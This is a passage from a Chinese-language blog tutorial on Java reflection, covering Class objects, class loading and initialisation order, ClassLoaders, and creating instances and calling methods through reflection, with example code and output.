class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=<span class="hljs-string">&quot;学生&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">teacher</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">person</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">teacher</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=<span class="hljs-string">&quot;老师&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300323.png" alt="image-20220930193902067"> </p><h3 id="获取class的实例"><a href="#获取class的实例" class="headerlink" title="获取class的实例"></a>获取class的实例</h3><p>a）若已知具体的类，通过类的class属性获取，该方法最为安全可靠，程序性能最高。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class c1=Person.class<br></code></pre></td></tr></table></figure><p>b）已知某个类的实例，调用该实例的getClass()方法获取Class对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> person.getClass();<br></code></pre></td></tr></table></figure><p>c）已知一个类的全类名，且该类在类路径下，可通过Class类的静态方法forName()获取，可能抛出ClassNotFoundException</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;demo01.Student&quot;</span>);<br></code></pre></td></tr></table></figure><p>d）内置基本数据类型可以直接用类名.Type</p><p>e）还可以利用ClassLoader我们之后讲解</p><h3 id="那一些类型可以有Class对象"><a href="#那一些类型可以有Class对象" class="headerlink" title="那一些类型可以有Class对象"></a>那一些类型可以有Class对象</h3><ul><li>class：外部类，成员(成员内部类，静态内部类)，局部内部类，匿名内部类</li><li>interface：接口</li><li>[]：数组</li><li>enum：枚举</li><li>annotation：注解@interface</li><li>primitive type：基本数据类型</li><li>void</li></ul><p>有一个有趣的小实验</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">reflect</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-type">int</span>[] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">100</span>];<br>        <span class="hljs-type">int</span>[] b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1000</span>];<br>        System.out.println(a.getClass().hashCode());<br>        System.out.println(b.getClass().hashCode());<br><br><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//输出结果为</span><br><span class="hljs-number">41903949</span><br><span class="hljs-number">41903949</span><br><br></code></pre></td></tr></table></figure><p>大小不同的数组，其实用的是同一个class</p><p>所以我们得出结论，只要元素维度一样，就是同一个class</p><h2 id="5、Java内存分析"><a href="#5、Java内存分析" class="headerlink" title="5、Java内存分析"></a>5、Java内存分析</h2><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301697.png" alt="image-20220930203511713"> </p><h3 id="类的加载过程"><a href="#类的加载过程" class="headerlink" title="类的加载过程"></a>类的加载过程</h3><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301786.png" alt="image-20220930203551658"> </p><h3 id="类的加载与ClassLoader的理解"><a href="#类的加载与ClassLoader的理解" class="headerlink" title="类的加载与ClassLoader的理解"></a>类的加载与ClassLoader的理解</h3><p>首先有三个区域</p><p>堆、栈、方法区（特殊的堆）</p><ul><li>加载：<ul><li>将class文件字节码内容加载到内存中，并将这些静态数据转换成方法区的运行时数据结构，然后生成一个代表这个类的java.lang.Class对象.</li></ul></li><li>链接：将Java类的二进制代码合并到JVM的运行状态之中的过程。<ul><li>验证：确保加载的类信息符合JVM规范，没有安全方面的问题</li><li>准备：正式为类变量（static）分配内存并设置类变量默认初始值的阶段，这些内存都将在方法区中进行分配。</li><li>解析：虚拟机常量池内的符号引用（常量名）替换为直接引用（地址）的过程。</li></ul></li><li>初始化<ul><li>执行类构造器<code>&lt;clinit&gt;()</code>方法的过程。类构造器()方法是由编译期自动收集类中所有类<strong>变量的赋值动作和静态代码块中的语句合并产生的</strong>。（类构造器是构造类信息的，不是构造该类对象的构造器）。</li><li>当初始化一个类的时候，如果发现其父类还没有进行初始化，则需要先触发其父类的初始化。</li><li>虚拟机会保证一个类的()方法在多线程环境中被正确加锁和同步。</li></ul></li></ul><p>下面来看一个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test05</span> &#123;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">a</span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;a类代码初始化&quot;</span>);<br>        m=<span class="hljs-number">300</span>;<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> m=<span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">a</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;a的无参构造初始化&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在我们加载的时候把字节码加载到内存当中，就形成了这两个Java.lang.Class对象，在堆中这两个对象分别代表着方法区中的类</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301598.png" alt="image-20220930204410623"> </p><p>然后我们准备开始执行我们的main方法</p><p>正式为类变量（static）分配内存并设置类变量默认初始值的阶段，这些内存都将在方法区中进行分配。m的初始值为0，并且把符号替换为直接引用（由变量名）</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301292.png" alt="image-20220930204755428"> </p><p>然后我们new了一个对象a，这个对象a就代表Java.lang.Class里面的东西，从而指向a类的数据，也就拿到了a类的数据</p><p>之后执行<code>clinit()</code>方法，把所有静态代码块合并，于是得到</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">m</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">300</span><br><span class="hljs-attribute">m</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><p><strong>总结步骤如下</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301603.png" alt="image-20220930205356851"> </p><h3 id="什么时候会发生类的初始化"><a href="#什么时候会发生类的初始化" class="headerlink" title="什么时候会发生类的初始化"></a>什么时候会发生类的初始化</h3><ul><li><h4 id="类的主动引用（一定会发生初始化）"><a href="#类的主动引用（一定会发生初始化）" class="headerlink" title="类的主动引用（一定会发生初始化）"></a>类的主动引用（一定会发生初始化）</h4><ul><li>当虚拟机启动，先初始化main方法所在的类</li><li>new一个类的对象</li><li>调用类的静态成员（除了fifinal常量）和静态方法</li><li>使用java.lang.reflflect包的方法对类进行反射调用</li><li>当初始化一个类，如果其父类没有被初始化，则先会初始化它的父类</li></ul></li></ul><p>示例如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.ServerError;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test05</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;main类被加载&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//主动引用</span><br>        Student s=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father</span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> b=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;父类被加载&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Father</span>&#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;子类被加载&quot;</span>);<br>        m=<span class="hljs-number">300</span>;<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> m=<span class="hljs-number">100</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">main</span>类被加载<br>父类被加载<br>子类被加载<br></code></pre></td></tr></table></figure><p>修改代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>       <span class="hljs-comment">//主动引用</span><br>       <span class="hljs-comment">//Student s=new Student();</span><br>       <span class="hljs-comment">//反射也会产生主动引用</span><br>       Class.forName(<span class="hljs-string">&quot;Student&quot;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><p>结果和上面一样</p><ul><li><h4 id="类的被动引用"><a href="#类的被动引用" class="headerlink" title="类的被动引用"></a>类的被动引用</h4><ul><li>当访问一个静态域时，只有真正声明这个域的类才会被初始化。如：当通过子类引用父类的静态变量，不会导致子类初始化</li><li>通过数组定义类引用，不会触发此类的初始化</li><li>引用常量不会触发此类的初始化（常量在链接阶段就存入调用类的常量池中了）</li></ul></li></ul><p>修改代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//不会产生类的引用的方法</span><br>    System.out.println(Student.b);<br>&#125;<br></code></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">main</span>类被加载<br>父类被加载<br><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>发现没有被加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>       Student[] arra=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>[<span class="hljs-number">5</span>];<br>   &#125;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">main</span>类被加载<br></code></pre></td></tr></table></figure><h3 id="类加载器作用"><a href="#类加载器作用" class="headerlink" title="类加载器作用"></a>类加载器作用</h3><ul><li>类加载的作用：将class文件字节码内容加载到内存中，并将这些静态数据转换成方法区的运行时数据结构，然后在堆中生成一个代表这个类的java.lang.Class对象，作为方法区中类数据的访问入口。</li><li>类缓存：标准的JavaSE类加载器可以按要求查找类，但一旦某个类被加载到类加载器中，它将维持加载（缓存）一段时间。不过JVM垃圾回收机制可以回收这些Class对象</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301533.png" alt="image-20220930220818123"> </p><ul><li>类加载器作用是用来把类(class)装载进内存的。JVM 规范定义了如下类型的类的加载器</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301668.png" alt="image-20220930220859920"> </p><p>下面这一些代码检测了类加载器是由哪一些成分加载的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//获取系统类的加载器</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">systemClassLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        System.out.println(systemClassLoader);<br>        <span class="hljs-comment">//获取系统加载器的父类加载器-&gt;拓展类加载器</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent</span> <span class="hljs-operator">=</span> systemClassLoader.getParent();<br>        System.out.println(parent);<br>        <span class="hljs-comment">//获取拓展类加载器的父类加载器-&gt;根加载器（c/c++）</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent1</span> <span class="hljs-operator">=</span> parent.getParent();<br>        System.out.println(parent1);<br>        <span class="hljs-comment">//测试当前类是哪一个类加载的</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;test&quot;</span>).getClassLoader();<br>        System.out.println(test);<br>        <span class="hljs-comment">//测试jdk内置的类是谁加载的</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>).getClassLoader();<br>        System.out.println(test1);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>一个快捷键ctrl+alt+v</p><p>输出结果</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">jdk<span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.loader</span>.ClassLoaders<span class="hljs-variable">$AppClassLoader</span>@<span class="hljs-number">1</span>f89ab83<br>jdk<span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.loader</span>.ClassLoaders<span class="hljs-variable">$PlatformClassLoader</span>@<span class="hljs-number">27</span>f674d<br>null<br>jdk<span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.loader</span>.ClassLoaders<span class="hljs-variable">$AppClassLoader</span>@<span class="hljs-number">1</span>f89ab83<br>null<br></code></pre></td></tr></table></figure><h2 id="6、获取类运行时的完整结构"><a href="#6、获取类运行时的完整结构" class="headerlink" title="6、获取类运行时的完整结构"></a>6、获取类运行时的完整结构</h2><p>通过反射获取运行时类的完整结构</p><p>Field、Method、Constructor、Superclass、Interface、Annotation</p><p>作用如下</p><ul><li>实现全部的接口</li><li>找到所继承的父类</li><li>全部的构造器</li><li>全部的方法</li><li>全部的Field</li><li>注解</li></ul><p>示例代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test09</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-comment">//获取类的名字</span><br>        System.out.println(test.getName());<span class="hljs-comment">//获取包名+类名</span><br>        System.out.println(test.getSimpleName());<span class="hljs-comment">//获取类名</span><br><br>        <span class="hljs-comment">//在Java反射中Field用于获取某个类的属性或该属性的属性值</span><br>        Field[] fields = test.getFields();<span class="hljs-comment">//只能找到public属性</span><br>        Field[] declaredFields = test.getDeclaredFields();<span class="hljs-comment">//能够找到全部的属性</span><br>        <span class="hljs-keyword">for</span>(Field field:declaredFields)&#123;<br>            System.out.println(field);<br>        &#125;<br><br>        <span class="hljs-comment">//获取类的方法</span><br>        Method[] methods = test.getMethods();<span class="hljs-comment">//获取本类以及父类的所有方法</span><br>        <span class="hljs-keyword">for</span>(Method method:methods)&#123;<br>            System.out.println(<span class="hljs-string">&quot;正常的&quot;</span>+method);<br>        &#125;<br>        methods=test.getDeclaredMethods();<span class="hljs-comment">//获取本类的所有方法</span><br>        <span class="hljs-keyword">for</span>(Method method:methods)&#123;<br>            System.out.println(<span class="hljs-string">&quot;getdeclaredmethod&quot;</span>+method);<br>        &#125;<br><br>        <span class="hljs-comment">//获得指定方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> test.getMethod(<span class="hljs-string">&quot;method&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> test.getMethod(<span class="hljs-string">&quot;method2&quot;</span>, <span class="hljs-type">char</span>.class);<br><br>        <span class="hljs-comment">//获得指定的构造器</span><br>        Constructor[] constructors = test.getConstructors();<span class="hljs-comment">//只获得public方法</span><br>        Constructor[] declaredConstructors = test.getDeclaredConstructors();<span class="hljs-comment">//可以获得本类的所有方法</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> test.getConstructor(<span class="hljs-type">char</span>.class, String.class, <span class="hljs-type">int</span>.class);<span class="hljs-comment">//获得指定的构造器</span><br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="7、有了Class对象，我们能做什么"><a href="#7、有了Class对象，我们能做什么" class="headerlink" title="7、有了Class对象，我们能做什么"></a>7、有了Class对象，我们能做什么</h2><ul><li><p>创建类的对象：调用Class对象的newInstance()方法</p><ul><li>类必须有一个无参数的构造器。</li><li>类的构造器的访问权限需要足够</li></ul></li><li><p>思考？难道没有无参的构造器就不能创建对象了吗？只要在操作的时候明确的调用类中的构造器，并将参数传递进去之后，才可以实例化操作</p></li><li><p>步骤如下</p><ul><li>通过Class类的getDeclaredConstructor(Class … parameterTypes)取得本类的指定形参类型的构造器</li><li>向构造器的形参中传递一个对象数组进去，里面包含了构造器中所需的各个参数。</li><li>通过Constructor实例化对象</li></ul></li></ul><p><strong>下面是一些示例：</strong></p><p>对于不带参数的public类型的Class，我们可以直接对其创建实例，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">String s = String.<span class="hljs-keyword">class</span>.<span class="hljs-title function_ invoke__">newInstance</span>();<br></code></pre></td></tr></table></figure><p>但对于带参数的Class，需要调用其带任意参数的构造方法，必须借助于Constructor对象</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp">Constructor cons1 = Child.<span class="hljs-keyword">class</span>.getConstructor(String.<span class="hljs-keyword">class</span>,<span class="hljs-built_in">int</span>.<span class="hljs-keyword">class</span>);<br>Child kid = (Child) cons1.newInstance(<span class="hljs-string">&quot;testName&quot;</span>,<span class="hljs-number">60</span>);<br>System.<span class="hljs-keyword">out</span>.println(kid.name);<br></code></pre></td></tr></table></figure><ol><li>首先获取该对象的构造方法</li><li>对该构造方法调用newInstance并传入特定参数，创建实例成功</li><li>Constructor有getConstructor(Class)、getDeclaredConstructor(Class)、getConstructors()、getDeclaredConstructors()，使用方法类似，不再赘述</li></ol><p><strong>调用指定的方法</strong></p><ul><li><p>通过反射，调用类中的方法，通过Method类完成</p><ul><li>通过Class类的getMethod(String name,Class…parameterTypes)方法取得一个Method对象，并设置此方法操作时所需要的参数类型。</li><li>之后使用Object invoke(Object obj, Object[] args)进行调用，并向方法中传递要设置的obj对象的参数信息。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301846.png" alt="image-20221002194905431"> </p><ul><li>Object 对应原方法的返回值，若原方法无返回值，此时返回null</li><li>若原方法若为静态方法，此时形参Object obj可为null</li><li>若原方法形参列表为空，则Object[] args为null</li><li>若原方法声明为private,则需要在调用此invoke()方法前，显式调用方法对象的setAccessible(true)方法，将可访问private的方法。</li></ul></li></ul><p>这是两段测试代码（不知道为什么直接打印一个类的时候会输出@什么东西）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test09</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException &#123;<br>        <span class="hljs-comment">//获取对象</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;test01&quot;</span>);<br><br>        <span class="hljs-comment">//构造对象</span><br>        <span class="hljs-comment">//newInstance方法讲解</span><br>        <span class="hljs-comment">//类类和构造函数类的 newInstance（） 方法用于创建该类的新实例。</span><br>        <span class="hljs-type">test01</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (test01) c1.newInstance();<span class="hljs-comment">//本质上是调用无参构造器</span><br>        System.out.println(o.name);<br><br>        <span class="hljs-comment">//通过构造器创建带参数的class对象对象</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor(String.class);<br>        <span class="hljs-type">test01</span> <span class="hljs-variable">newperson</span> <span class="hljs-operator">=</span> (test01) declaredConstructor.newInstance(<span class="hljs-string">&quot;lyj&quot;</span>);<br>        System.out.println(newperson.name);<br><br>        <span class="hljs-comment">//调用普通方法，没有办法直接调用，得先获取</span><br>        <span class="hljs-type">test01</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span> (test01)c1.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">setName</span> <span class="hljs-operator">=</span> c1.getDeclaredMethod(<span class="hljs-string">&quot;setName&quot;</span>, String.class);<span class="hljs-comment">//先获取这个方法</span><br>        setName.invoke(o1,<span class="hljs-string">&quot;fuck&quot;</span>);<span class="hljs-comment">//通过invoke方法激活并修改值（对象，”方法的值“）</span><br>        System.out.println(o1.getName());<br><br>        <span class="hljs-comment">//通过反射操作属性</span><br>        <span class="hljs-type">test01</span> <span class="hljs-variable">o2</span> <span class="hljs-operator">=</span> (test01)c1.newInstance();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        name1.set(o2,<span class="hljs-string">&quot;fuzz&quot;</span>);<br>        System.out.println(o2.getName());<br><br>    &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">test01</span>&#123;<br>    String name=<span class="hljs-string">&quot;ace&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">test01</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">test01</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span 